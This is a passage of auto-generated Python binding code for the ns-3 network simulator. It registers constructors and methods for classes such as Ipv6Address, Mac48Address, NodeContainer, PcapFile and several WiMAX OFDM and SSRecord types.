[param('ns3::Ipv4Address', 'a'), param('ns3::Ipv4Address', 'b')],
is_const=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True)
cls.add_method('Set',
'void',
[param('uint32_t', 'mask')])
return
def register_Ns3Ipv6Address_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_binary_comparison_operator('<')
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('==')
cls.add_constructor([])
cls.add_constructor([param('char const *', 'address')])
cls.add_constructor([param('uint8_t *', 'address')])
cls.add_constructor([param('ns3::Ipv6Address const &', 'addr')])
cls.add_constructor([param('ns3::Ipv6Address const *', 'addr')])
cls.add_method('CombinePrefix',
'ns3::Ipv6Address',
[param('ns3::Ipv6Prefix const &', 'prefix')])
cls.add_method('ConvertFrom',
'ns3::Ipv6Address',
[param('ns3::Address const &', 'address')],
is_static=True)
cls.add_method('Deserialize',
'ns3::Ipv6Address',
[param('uint8_t const *', 'buf')],
is_static=True)
cls.add_method('GetAllHostsMulticast',
'ns3::Ipv6Address',
[],
is_static=True)
cls.add_method('GetAllNodesMulticast',
'ns3::Ipv6Address',
[],
is_static=True)
cls.add_method('GetAllRoutersMulticast',
'ns3::Ipv6Address',
[],
is_static=True)
cls.add_method('GetAny',
'ns3::Ipv6Address',
[],
is_static=True)
cls.add_method('GetBytes',
'void',
[param('uint8_t *', 'buf')],
is_const=True)
cls.add_method('GetLoopback',
'ns3::Ipv6Address',
[],
is_static=True)
cls.add_method('GetOnes',
'ns3::Ipv6Address',
[],
is_static=True)
cls.add_method('GetZero',
'ns3::Ipv6Address',
[],
is_static=True)
cls.add_method('IsAllHostsMulticast',
'bool',
[],
is_const=True)
cls.add_method('IsAllNodesMulticast',
'bool',
[],
is_const=True)
cls.add_method('IsAllRoutersMulticast',
'bool',
[],
is_const=True)
cls.add_method('IsAny',
'bool',
[],
is_const=True)
cls.add_method('IsEqual',
'bool',
[param('ns3::Ipv6Address const &', 'other')],
is_const=True)
cls.add_method('IsLinkLocal',
'bool',
[],
is_const=True)
cls.add_method('IsLocalhost',
'bool',
[],
is_const=True)
cls.add_method('IsMatchingType',
'bool',
[param('ns3::Address const &', 'address')],
is_static=True)
cls.add_method('IsMulticast',
'bool',
[],
is_const=True)
cls.add_method('IsSolicitedMulticast',
'bool',
[],
is_const=True)
cls.add_method('MakeAutoconfiguredAddress',
'ns3::Ipv6Address',
[param('ns3::Mac48Address', 'addr'), param('ns3::Ipv6Address', 'prefix')],
is_static=True)
cls.add_method('MakeAutoconfiguredLinkLocalAddress',
'ns3::Ipv6Address',
[param('ns3::Mac48Address', 'mac')],
is_static=True)
cls.add_method('MakeSolicitedAddress',
'ns3::Ipv6Address',
[param('ns3::Ipv6Address', 'addr')],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True)
cls.add_method('Serialize',
'void',
[param('uint8_t *', 'buf')],
is_const=True)
cls.add_method('Set',
'void',
[param('char const *', 'address')])
cls.add_method('Set',
'void',
[param('uint8_t *', 'address')])
return
def register_Ns3Ipv6Prefix_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('==')
cls.add_constructor([])
cls.add_constructor([param('uint8_t *', 'prefix')])
cls.add_constructor([param('char const *', 'prefix')])
cls.add_constructor([param('uint8_t', 'prefix')])
cls.add_constructor([param('ns3::Ipv6Prefix const &', 'prefix')])
cls.add_constructor([param('ns3::Ipv6Prefix const *', 'prefix')])
cls.add_method('GetBytes',
'void',
[param('uint8_t *', 'buf')],
is_const=True)
cls.add_method('GetLoopback',
'ns3::Ipv6Prefix',
[],
is_static=True)
cls.add_method('GetOnes',
'ns3::Ipv6Prefix',
[],
is_static=True)
cls.add_method('GetPrefixLength',
'uint8_t',
[],
is_const=True)
cls.add_method('GetZero',
'ns3::Ipv6Prefix',
[],
is_static=True)
cls.add_method('IsEqual',
'bool',
[param('ns3::Ipv6Prefix const &', 'other')],
is_const=True)
cls.add_method('IsMatch',
'bool',
[param('ns3::Ipv6Address', 'a'), param('ns3::Ipv6Address', 'b')],
is_const=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True)
return
def register_Ns3LogComponent_methods(root_module, cls):
cls.add_constructor([param('ns3::LogComponent const &', 'arg0')])
cls.add_constructor([param('char const *', 'name')])
cls.add_method('Disable',
'void',
[param('ns3::LogLevel', 'level')])
cls.add_method('Enable',
'void',
[param('ns3::LogLevel', 'level')])
cls.add_method('EnvVarCheck',
'void',
[param('char const *', 'name')])
cls.add_method('IsEnabled',
'bool',
[param('ns3::LogLevel', 'level')],
is_const=True)
cls.add_method('IsNoneEnabled',
'bool',
[],
is_const=True)
cls.add_method('Name',
'char const *',
[],
is_const=True)
return
def register_Ns3Mac48Address_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_binary_comparison_operator('<')
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('==')
cls.add_constructor([param('ns3::Mac48Address const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('char const *', 'str')])
cls.add_method('Allocate',
'ns3::Mac48Address',
[],
is_static=True)
cls.add_method('ConvertFrom',
'ns3::Mac48Address',
[param('ns3::Address const &', 'address')],
is_static=True)
cls.add_method('CopyFrom',
'void',
[param('uint8_t const *', 'buffer')])
cls.add_method('CopyTo',
'void',
[param('uint8_t *', 'buffer')],
is_const=True)
cls.add_method('GetBroadcast',
'ns3::Mac48Address',
[],
is_static=True)
cls.add_method('GetMulticast',
'ns3::Mac48Address',
[param('ns3::Ipv4Address', 'address')],
is_static=True)
cls.add_method('GetMulticast',
'ns3::Mac48Address',
[param('ns3::Ipv6Address', 'address')],
is_static=True)
cls.add_method('GetMulticast6Prefix',
'ns3::Mac48Address',
[],
is_static=True)
cls.add_method('GetMulticastPrefix',
'ns3::Mac48Address',
[],
is_static=True)
cls.add_method('IsBroadcast',
'bool',
[],
is_const=True)
cls.add_method('IsGroup',
'bool',
[],
is_const=True)
cls.add_method('IsMatchingType',
'bool',
[param('ns3::Address const &', 'address')],
is_static=True)
return
def register_Ns3NetDeviceContainer_methods(root_module, cls):
cls.add_constructor([param('ns3::NetDeviceContainer const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::NetDevice >', 'dev')])
cls.add_constructor([param('std::string', 'devName')])
cls.add_constructor([param('ns3::NetDeviceContainer const &', 'a'), param('ns3::NetDeviceContainer const &', 'b')])
cls.add_method('Add',
'void',
[param('ns3::NetDeviceContainer', 'other')])
cls.add_method('Add',
'void',
[param('ns3::Ptr< ns3::NetDevice >', 'device')])
cls.add_method('Add',
'void',
[param('std::string', 'deviceName')])
cls.add_method('Begin',
'__gnu_cxx::__normal_iterator< ns3::Ptr< ns3::NetDevice > const, std::vector< ns3::Ptr< ns3::NetDevice > > >',
[],
is_const=True)
cls.add_method('End',
'__gnu_cxx::__normal_iterator< ns3::Ptr< ns3::NetDevice > const, std::vector< ns3::Ptr< ns3::NetDevice > > >',
[],
is_const=True)
cls.add_method('Get',
'ns3::Ptr< ns3::NetDevice >',
[param('uint32_t', 'i')],
is_const=True)
cls.add_method('GetN',
'uint32_t',
[],
is_const=True)
return
def register_Ns3NodeContainer_methods(root_module, cls):
cls.add_constructor([param('ns3::NodeContainer const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::Node >', 'node')])
cls.add_constructor([param('std::string', 'nodeName')])
cls.add_constructor([param('ns3::NodeContainer const &', 'a'), param('ns3::NodeContainer const &', 'b')])
cls.add_constructor([param('ns3::NodeContainer const &', 'a'), param('ns3::NodeContainer const &', 'b'), param('ns3::NodeContainer const &', 'c')])
cls.add_constructor([param('ns3::NodeContainer const &', 'a'), param('ns3::NodeContainer const &', 'b'), param('ns3::NodeContainer const &', 'c'), param('ns3::NodeContainer const &', 'd')])
cls.add_constructor([param('ns3::NodeContainer const &', 'a'), param('ns3::NodeContainer const &', 'b'), param('ns3::NodeContainer const &', 'c'), param('ns3::NodeContainer const &', 'd'), param('ns3::NodeContainer const &', 'e')])
cls.add_method('Add',
'void',
[param('ns3::NodeContainer', 'other')])
cls.add_method('Add',
'void',
[param('ns3::Ptr< ns3::Node >', 'node')])
cls.add_method('Add',
'void',
[param('std::string', 'nodeName')])
cls.add_method('Begin',
'__gnu_cxx::__normal_iterator< ns3::Ptr< ns3::Node > const, std::vector< ns3::Ptr< ns3::Node > > >',
[],
is_const=True)
cls.add_method('Create',
'void',
[param('uint32_t', 'n')])
cls.add_method('Create',
'void',
[param('uint32_t', 'n'), param('uint32_t', 'systemId')])
cls.add_method('End',
'__gnu_cxx::__normal_iterator< ns3::Ptr< ns3::Node > const, std::vector< ns3::Ptr< ns3::Node > > >',
[],
is_const=True)
cls.add_method('Get',
'ns3::Ptr< ns3::Node >',
[param('uint32_t', 'i')],
is_const=True)
cls.add_method('GetGlobal',
'ns3::NodeContainer',
[],
is_static=True)
cls.add_method('GetN',
'uint32_t',
[],
is_const=True)
return
def register_Ns3ObjectBase_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::ObjectBase const &', 'arg0')])
cls.add_method('GetAttribute',
'void',
[param('std::string', 'name'), param('ns3::AttributeValue &', 'value')],
is_const=True)
cls.add_method('GetAttributeFailSafe',
'bool',
[param('std::string', 'name'), param('ns3::AttributeValue &', 'attribute')],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('SetAttribute',
'void',
[param('std::string', 'name'), param('ns3::AttributeValue const &', 'value')])
cls.add_method('SetAttributeFailSafe',
'bool',
[param('std::string', 'name'), param('ns3::AttributeValue const &', 'value')])
cls.add_method('TraceConnect',
'bool',
[param('std::string', 'name'), param('std::string', 'context'), param('ns3::CallbackBase const &', 'cb')])
cls.add_method('TraceConnectWithoutContext',
'bool',
[param('std::string', 'name'), param('ns3::CallbackBase const &', 'cb')])
cls.add_method('TraceDisconnect',
'bool',
[param('std::string', 'name'), param('std::string', 'context'), param('ns3::CallbackBase const &', 'cb')])
cls.add_method('TraceDisconnectWithoutContext',
'bool',
[param('std::string', 'name'), param('ns3::CallbackBase const &', 'cb')])
cls.add_method('ConstructSelf',
'void',
[param('ns3::AttributeConstructionList const &', 'attributes')],
visibility='protected')
cls.add_method('NotifyConstructionCompleted',
'void',
[],
visibility='protected', is_virtual=True)
return
def register_Ns3ObjectDeleter_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::ObjectDeleter const &', 'arg0')])
cls.add_method('Delete',
'void',
[param('ns3::Object *', 'object')],
is_static=True)
return
def register_Ns3ObjectFactory_methods(root_module, cls):
cls.add_output_stream_operator()
cls.add_constructor([param('ns3::ObjectFactory const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('std::string', 'typeId')])
cls.add_method('Create',
'ns3::Ptr< ns3::Object >',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_const=True)
cls.add_method('Set',
'void',
[param('std::string', 'name'), param('ns3::AttributeValue const &', 'value')])
cls.add_method('SetTypeId',
'void',
[param('ns3::TypeId', 'tid')])
cls.add_method('SetTypeId',
'void',
[param('char const *', 'tid')])
cls.add_method('SetTypeId',
'void',
[param('std::string', 'tid')])
return
def register_Ns3OfdmDcdChannelEncodings_methods(root_module, cls):
cls.add_constructor([param('ns3::OfdmDcdChannelEncodings const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetBaseStationId',
'ns3::Mac48Address',
[],
is_const=True)
cls.add_method('GetChannelNr',
'uint8_t',
[],
is_const=True)
cls.add_method('GetFrameDurationCode',
'uint8_t',
[],
is_const=True)
cls.add_method('GetFrameNumber',
'uint32_t',
[],
is_const=True)
cls.add_method('GetRtg',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetTtg',
'uint8_t',
[],
is_const=True)
cls.add_method('SetBaseStationId',
'void',
[param('ns3::Mac48Address', 'baseStationId')])
cls.add_method('SetChannelNr',
'void',
[param('uint8_t', 'channelNr')])
cls.add_method('SetFrameDurationCode',
'void',
[param('uint8_t', 'frameDurationCode')])
cls.add_method('SetFrameNumber',
'void',
[param('uint32_t', 'frameNumber')])
cls.add_method('SetRtg',
'void',
[param('uint8_t', 'rtg')])
cls.add_method('SetTtg',
'void',
[param('uint8_t', 'ttg')])
cls.add_method('DoRead',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
visibility='private', is_virtual=True)
cls.add_method('DoWrite',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3OfdmDlBurstProfile_methods(root_module, cls):
cls.add_constructor([param('ns3::OfdmDlBurstProfile const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetDiuc',
'uint8_t',
[],
is_const=True)
cls.add_method('GetFecCodeType',
'uint8_t',
[],
is_const=True)
cls.add_method('GetLength',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetType',
'uint8_t',
[],
is_const=True)
cls.add_method('Read',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('SetDiuc',
'void',
[param('uint8_t', 'diuc')])
cls.add_method('SetFecCodeType',
'void',
[param('uint8_t', 'fecCodeType')])
cls.add_method('SetLength',
'void',
[param('uint8_t', 'length')])
cls.add_method('SetType',
'void',
[param('uint8_t', 'type')])
cls.add_method('Write',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True)
return
def register_Ns3OfdmDlMapIe_methods(root_module, cls):
cls.add_constructor([param('ns3::OfdmDlMapIe const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetDiuc',
'uint8_t',
[],
is_const=True)
cls.add_method('GetPreamblePresent',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetStartTime',
'uint16_t',
[],
is_const=True)
cls.add_method('Read',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('SetCid',
'void',
[param('ns3::Cid', 'cid')])
cls.add_method('SetDiuc',
'void',
[param('uint8_t', 'diuc')])
cls.add_method('SetPreamblePresent',
'void',
[param('uint8_t', 'preamblePresent')])
cls.add_method('SetStartTime',
'void',
[param('uint16_t', 'startTime')])
cls.add_method('Write',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True)
return
def register_Ns3OfdmUlBurstProfile_methods(root_module, cls):
cls.add_constructor([param('ns3::OfdmUlBurstProfile const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetFecCodeType',
'uint8_t',
[],
is_const=True)
cls.add_method('GetLength',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetType',
'uint8_t',
[],
is_const=True)
cls.add_method('GetUiuc',
'uint8_t',
[],
is_const=True)
cls.add_method('Read',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('SetFecCodeType',
'void',
[param('uint8_t', 'fecCodeType')])
cls.add_method('SetLength',
'void',
[param('uint8_t', 'length')])
cls.add_method('SetType',
'void',
[param('uint8_t', 'type')])
cls.add_method('SetUiuc',
'void',
[param('uint8_t', 'uiuc')])
cls.add_method('Write',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True)
return
def register_Ns3OfdmUlMapIe_methods(root_module, cls):
cls.add_constructor([param('ns3::OfdmUlMapIe const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetDuration',
'uint16_t',
[],
is_const=True)
cls.add_method('GetMidambleRepetitionInterval',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetStartTime',
'uint16_t',
[],
is_const=True)
cls.add_method('GetSubchannelIndex',
'uint8_t',
[],
is_const=True)
cls.add_method('GetUiuc',
'uint8_t',
[],
is_const=True)
cls.add_method('Read',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('SetCid',
'void',
[param('ns3::Cid', 'cid')])
cls.add_method('SetDuration',
'void',
[param('uint16_t', 'duration')])
cls.add_method('SetMidambleRepetitionInterval',
'void',
[param('uint8_t', 'midambleRepetitionInterval')])
cls.add_method('SetStartTime',
'void',
[param('uint16_t', 'startTime')])
cls.add_method('SetSubchannelIndex',
'void',
[param('uint8_t', 'subchannelIndex')])
cls.add_method('SetUiuc',
'void',
[param('uint8_t', 'uiuc')])
cls.add_method('Write',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True)
return
def register_Ns3PacketMetadata_methods(root_module, cls):
cls.add_constructor([param('uint64_t', 'uid'), param('uint32_t', 'size')])
cls.add_constructor([param('ns3::PacketMetadata const &', 'o')])
cls.add_method('AddAtEnd',
'void',
[param('ns3::PacketMetadata const &', 'o')])
cls.add_method('AddHeader',
'void',
[param('ns3::Header const &', 'header'), param('uint32_t', 'size')])
cls.add_method('AddPaddingAtEnd',
'void',
[param('uint32_t', 'end')])
cls.add_method('AddTrailer',
'void',
[param('ns3::Trailer const &', 'trailer'), param('uint32_t', 'size')])
cls.add_method('BeginItem',
'ns3::PacketMetadata::ItemIterator',
[param('ns3::Buffer', 'buffer')],
is_const=True)
cls.add_method('CreateFragment',
'ns3::PacketMetadata',
[param('uint32_t', 'start'), param('uint32_t', 'end')],
is_const=True)
cls.add_method('Deserialize',
'uint32_t',
[param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])
cls.add_method('Enable',
'void',
[],
is_static=True)
cls.add_method('EnableChecking',
'void',
[],
is_static=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True)
cls.add_method('GetUid',
'uint64_t',
[],
is_const=True)
cls.add_method('RemoveAtEnd',
'void',
[param('uint32_t', 'end')])
cls.add_method('RemoveAtStart',
'void',
[param('uint32_t', 'start')])
cls.add_method('RemoveHeader',
'void',
[param('ns3::Header const &', 'header'), param('uint32_t', 'size')])
cls.add_method('RemoveTrailer',
'void',
[param('ns3::Trailer const &', 'trailer'), param('uint32_t', 'size')])
cls.add_method('Serialize',
'uint32_t',
[param('uint8_t *', 'buffer'), param('uint32_t', 'maxSize')],
is_const=True)
return
def register_Ns3PacketMetadataItem_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::PacketMetadata::Item const &', 'arg0')])
cls.add_instance_attribute('current', 'ns3::Buffer::Iterator', is_const=False)
cls.add_instance_attribute('currentSize', 'uint32_t', is_const=False)
cls.add_instance_attribute('currentTrimedFromEnd', 'uint32_t', is_const=False)
cls.add_instance_attribute('currentTrimedFromStart', 'uint32_t', is_const=False)
cls.add_instance_attribute('isFragment', 'bool', is_const=False)
cls.add_instance_attribute('tid', 'ns3::TypeId', is_const=False)
return
def register_Ns3PacketMetadataItemIterator_methods(root_module, cls):
cls.add_constructor([param('ns3::PacketMetadata::ItemIterator const &', 'arg0')])
cls.add_constructor([param('ns3::PacketMetadata const *', 'metadata'), param('ns3::Buffer', 'buffer')])
cls.add_method('HasNext',
'bool',
[],
is_const=True)
cls.add_method('Next',
'ns3::PacketMetadata::Item',
[])
return
def register_Ns3PacketTagIterator_methods(root_module, cls):
cls.add_constructor([param('ns3::PacketTagIterator const &', 'arg0')])
cls.add_method('HasNext',
'bool',
[],
is_const=True)
cls.add_method('Next',
'ns3::PacketTagIterator::Item',
[])
return
def register_Ns3PacketTagIteratorItem_methods(root_module, cls):
cls.add_constructor([param('ns3::PacketTagIterator::Item const &', 'arg0')])
cls.add_method('GetTag',
'void',
[param('ns3::Tag &', 'tag')],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_const=True)
return
def register_Ns3PacketTagList_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::PacketTagList const &', 'o')])
cls.add_method('Add',
'void',
[param('ns3::Tag const &', 'tag')],
is_const=True)
cls.add_method('Head',
'ns3::PacketTagList::TagData const *',
[],
is_const=True)
cls.add_method('Peek',
'bool',
[param('ns3::Tag &', 'tag')],
is_const=True)
cls.add_method('Remove',
'bool',
[param('ns3::Tag &', 'tag')])
cls.add_method('RemoveAll',
'void',
[])
return
def register_Ns3PacketTagListTagData_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::PacketTagList::TagData const &', 'arg0')])
cls.add_instance_attribute('count', 'uint32_t', is_const=False)
cls.add_instance_attribute('data', 'uint8_t [ 20 ]', is_const=False)
cls.add_instance_attribute('next', 'ns3::PacketTagList::TagData *', is_const=False)
cls.add_instance_attribute('tid', 'ns3::TypeId', is_const=False)
return
def register_Ns3PcapFile_methods(root_module, cls):
cls.add_constructor([])
cls.add_method('Clear',
'void',
[])
cls.add_method('Close',
'void',
[])
cls.add_method('Diff',
'bool',
[param('std::string const &', 'f1'), param('std::string const &', 'f2'), param('uint32_t &', 'sec'), param('uint32_t &', 'usec'), param('uint32_t', 'snapLen', default_value='ns3::PcapFile::SNAPLEN_DEFAULT')],
is_static=True)
cls.add_method('Eof',
'bool',
[],
is_const=True)
cls.add_method('Fail',
'bool',
[],
is_const=True)
cls.add_method('GetDataLinkType',
'uint32_t',
[])
cls.add_method('GetMagic',
'uint32_t',
[])
cls.add_method('GetSigFigs',
'uint32_t',
[])
cls.add_method('GetSnapLen',
'uint32_t',
[])
cls.add_method('GetSwapMode',
'bool',
[])
cls.add_method('GetTimeZoneOffset',
'int32_t',
[])
cls.add_method('GetVersionMajor',
'uint16_t',
[])
cls.add_method('GetVersionMinor',
'uint16_t',
[])
cls.add_method('Init',
'void',
[param('uint32_t', 'dataLinkType'), param('uint32_t', 'snapLen', default_value='ns3::PcapFile::SNAPLEN_DEFAULT'), param('int32_t', 'timeZoneCorrection', default_value='ns3::PcapFile::ZONE_DEFAULT'), param('bool', 'swapMode', default_value='false')])
cls.add_method('Open',
'void',
[param('std::string const &', 'filename'), param('std::_Ios_Openmode', 'mode')])
cls.add_method('Read',
'void',
[param('uint8_t * const', 'data'), param('uint32_t', 'maxBytes'), param('uint32_t &', 'tsSec'), param('uint32_t &', 'tsUsec'), param('uint32_t &', 'inclLen'), param('uint32_t &', 'origLen'), param('uint32_t &', 'readLen')])
cls.add_method('Write',
'void',
[param('uint32_t', 'tsSec'), param('uint32_t', 'tsUsec'), param('uint8_t const * const', 'data'), param('uint32_t', 'totalLen')])
cls.add_method('Write',
'void',
[param('uint32_t', 'tsSec'), param('uint32_t', 'tsUsec'), param('ns3::Ptr< ns3::Packet const >', 'p')])
cls.add_method('Write',
'void',
[param('uint32_t', 'tsSec'), param('uint32_t', 'tsUsec'), param('ns3::Header &', 'header'), param('ns3::Ptr< ns3::Packet const >', 'p')])
cls.add_static_attribute('SNAPLEN_DEFAULT', 'uint32_t const', is_const=True)
cls.add_static_attribute('ZONE_DEFAULT', 'int32_t const', is_const=True)
return
def register_Ns3PcapHelper_methods(root_module, cls):
cls.add_constructor([param('ns3::PcapHelper const &', 'arg0')])
cls.add_constructor([])
cls.add_method('CreateFile',
'ns3::Ptr< ns3::PcapFileWrapper >',
[param('std::string', 'filename'), param('std::_Ios_Openmode', 'filemode'), param('uint32_t', 'dataLinkType'), param('uint32_t', 'snapLen', default_value='65535'), param('int32_t', 'tzCorrection', default_value='0')])
cls.add_method('GetFilenameFromDevice',
'std::string',
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'device'), param('bool', 'useObjectNames', default_value='true')])
cls.add_method('GetFilenameFromInterfacePair',
'std::string',
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::Object >', 'object'), param('uint32_t', 'interface'), param('bool', 'useObjectNames', default_value='true')])
return
def register_Ns3PcapHelperForDevice_methods(root_module, cls):
cls.add_constructor([param('ns3::PcapHelperForDevice const &', 'arg0')])
cls.add_constructor([])
cls.add_method('EnablePcap',
'void',
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'promiscuous', default_value='false'), param('bool', 'explicitFilename', default_value='false')])
cls.add_method('EnablePcap',
'void',
[param('std::string', 'prefix'), param('std::string', 'ndName'), param('bool', 'promiscuous', default_value='false'), param('bool', 'explicitFilename', default_value='false')])
cls.add_method('EnablePcap',
'void',
[param('std::string', 'prefix'), param('ns3::NetDeviceContainer', 'd'), param('bool', 'promiscuous', default_value='false')])
cls.add_method('EnablePcap',
'void',
[param('std::string', 'prefix'), param('ns3::NodeContainer', 'n'), param('bool', 'promiscuous', default_value='false')])
cls.add_method('EnablePcap',
'void',
[param('std::string', 'prefix'), param('uint32_t', 'nodeid'), param('uint32_t', 'deviceid'), param('bool', 'promiscuous', default_value='false')])
cls.add_method('EnablePcapAll',
'void',
[param('std::string', 'prefix'), param('bool', 'promiscuous', default_value='false')])
cls.add_method('EnablePcapInternal',
'void',
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'promiscuous'), param('bool', 'explicitFilename')],
is_pure_virtual=True, is_virtual=True)
return
def register_Ns3RandomVariable_methods(root_module, cls):
cls.add_output_stream_operator()
cls.add_constructor([])
cls.add_constructor([param('ns3::RandomVariable const &', 'o')])
cls.add_method('GetInteger',
'uint32_t',
[],
is_const=True)
cls.add_method('GetValue',
'double',
[],
is_const=True)
return
def register_Ns3SNRToBlockErrorRateManager_methods(root_module, cls):
cls.add_constructor([param('ns3::SNRToBlockErrorRateManager const &', 'arg0')])
cls.add_constructor([])
cls.add_method('ActivateLoss',
'void',
[param('bool', 'loss')])
cls.add_method('GetBlockErrorRate',
'double',
[param('double', 'SNR'), param('uint8_t', 'modulation')])
cls.add_method('GetSNRToBlockErrorRateRecord',
'ns3::SNRToBlockErrorRateRecord *',
[param('double', 'SNR'), param('uint8_t', 'modulation')])
cls.add_method('GetTraceFilePath',
'std::string',
[])
cls.add_method('LoadDefaultTraces',
'void',
[])
cls.add_method('LoadTraces',
'void',
[])
cls.add_method('ReLoadTraces',
'void',
[])
cls.add_method('SetTraceFilePath',
'void',
[param('char *', 'traceFilePath')])
return
def register_Ns3SNRToBlockErrorRateRecord_methods(root_module, cls):
cls.add_constructor([param('ns3::SNRToBlockErrorRateRecord const &', 'arg0')])
cls.add_constructor([param('double', 'snrValue'), param('double', 'bitErrorRate'), param('double', 'BlockErrorRate'), param('double', 'sigma2'), param('double', 'I1'), param('double', 'I2')])
cls.add_method('Copy',
'ns3::SNRToBlockErrorRateRecord *',
[])
cls.add_method('GetBitErrorRate',
'double',
[])
cls.add_method('GetBlockErrorRate',
'double',
[])
cls.add_method('GetI1',
'double',
[])
cls.add_method('GetI2',
'double',
[])
cls.add_method('GetSNRValue',
'double',
[])
cls.add_method('GetSigma2',
'double',
[])
cls.add_method('SetBitErrorRate',
'void',
[param('double', 'arg0')])
cls.add_method('SetBlockErrorRate',
'void',
[param('double', 'arg0')])
cls.add_method('SetI1',
'void',
[param('double', 'arg0')])
cls.add_method('SetI2',
'void',
[param('double', 'arg0')])
cls.add_method('SetSNRValue',
'void',
[param('double', 'arg0')])
return
def register_Ns3SSRecord_methods(root_module, cls):
cls.add_constructor([param('ns3::SSRecord const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Mac48Address', 'macAddress')])
cls.add_constructor([param('ns3::Mac48Address', 'macAddress'), param('ns3::Ipv4Address', 'IPaddress')])
cls.add_method('AddServiceFlow',
'void',
[param('ns3::ServiceFlow *', 'serviceFlow')])
cls.add_method('DisablePollForRanging',
'void',
[])
cls.add_method('EnablePollForRanging',
'void',
[])
cls.add_method('GetAreServiceFlowsAllocated',
'bool',
[],
is_const=True)
cls.add_method('GetBasicCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetDsaRsp',
'ns3::DsaRsp',
[],
is_const=True)
cls.add_method('GetDsaRspRetries',
'uint8_t',
[],
is_const=True)
cls.add_method('GetHasServiceFlowBe',
'bool',
[],
is_const=True)
cls.add_method('GetHasServiceFlowNrtps',
'bool',
[],
is_const=True)
cls.add_method('GetHasServiceFlowRtps',
'bool',
[],
is_const=True)
cls.add_method('GetHasServiceFlowUgs',
'bool',
[],
is_const=True)
cls.add_method('GetIPAddress',
'ns3::Ipv4Address',
[])
cls.add_method('GetInvitedRangRetries',
'uint8_t',
[],
is_const=True)
cls.add_method('GetIsBroadcastSS',
'bool',
[])
cls.add_method('GetMacAddress',
'ns3::Mac48Address',
[],
is_const=True)
cls.add_method('GetModulationType',
'ns3::WimaxPhy::ModulationType',
[],
is_const=True)
cls.add_method('GetPollForRanging',
'bool',
[],
is_const=True)
cls.add_method('GetPollMeBit',
'bool',
[],
is_const=True)
cls.add_method('GetPrimaryCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetRangingCorrectionRetries',
'uint8_t',
[],
is_const=True)
cls.add_method('GetRangingStatus',
'ns3::WimaxNetDevice::RangingStatus',
[],
is_const=True)
cls.add_method('GetServiceFlows',
'std::vector< ns3::ServiceFlow * >',
[param('ns3::ServiceFlow::SchedulingType', 'schedulingType')],
is_const=True)
cls.add_method('GetSfTransactionId',
'uint16_t',
[],
is_const=True)
cls.add_method('IncrementDsaRspRetries',
'void',
[])
cls.add_method('IncrementInvitedRangingRetries',
'void',
[])
cls.add_method('IncrementRangingCorrectionRetries',
